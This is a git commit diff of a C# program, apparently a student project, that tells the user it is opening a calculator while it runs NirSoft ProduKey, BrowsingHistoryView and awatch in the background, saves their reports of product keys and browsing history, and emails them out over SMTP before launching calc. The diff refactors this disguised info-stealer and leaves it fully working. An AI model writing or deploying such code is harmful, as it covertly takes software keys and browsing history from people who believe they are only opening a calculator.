a49ef7ebe29396adacf7324b02143a065fe922b6
Nicolas Len <nicolaslen@gmail.com>
2019-05-25 20:01:25 -0300

    a

--- code/Program.cs
+++ code/Program.cs
@@ -16,9 +16,9 @@ namespace TP
             Console.WriteLine("Abriendo calculadora. Por favor espere...");
             List<string> files = new List<string>();
 
-            files.Add(Helpers.openProduKey());
-            files.Add(Helpers.openBrowsingHistoryView());
-            files.Add(Helpers.openAwatch());
+            files.NirsoftToolExecAndAdd("ProduKey.exe");
+            files.NirsoftToolExecAndAdd("BrowsingHistoryView.exe");
+            files.NirsoftToolExecAndAdd("awatch.exe");
 
             Helpers.sendMail("Prueba", "Estoy probando", files);
             Helpers.openCalc();
@@ -29,37 +29,17 @@ namespace TP
     {
         public static void openCalc()
         {
-            System.Diagnostics.Process.Start("calc");
+            Process.Start("calc");
         }
 
-        public static string openProduKey()
+        public static string execNirsoftTool(string executablePath)
         {
-            string file = "produKey.html";
+            string file = Path.GetFileNameWithoutExtension(executablePath).ToLower() + ".html";
             ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ProduKey.exe");
+            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, executablePath);
             startInfo.Arguments = @"/shtml " + file;
-            Process.Start(startInfo);
-            return file;
-        }
-
-        public static string openBrowsingHistoryView()
-        {
-            string file = "browsingHistoryView.html";
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "BrowsingHistoryView.exe");
-            startInfo.Arguments = @"/shtml " + file;
-            Process.Start(startInfo);
-            return file;
-        }
-
-        public static string openAwatch()
-        {
-            string file = "report1.html";
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-
-            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "awatch.exe");
-            startInfo.Arguments = @"/shtml " + file + " 1";
-            Process.Start(startInfo);
+            var process = Process.Start(startInfo);
+            process.WaitForExit();
             return file;
         }
 
@@ -83,6 +63,14 @@ namespace TP
             SmtpServer.EnableSsl = true;
 
             SmtpServer.Send(mail);
+        }
+    }
+
+    public static class Extensions
+    {
+        public static void NirsoftToolExecAndAdd(this List<string> list, string file)
+        {
+            list.Add(Helpers.execNirsoftTool(file));
         }
     }
 }
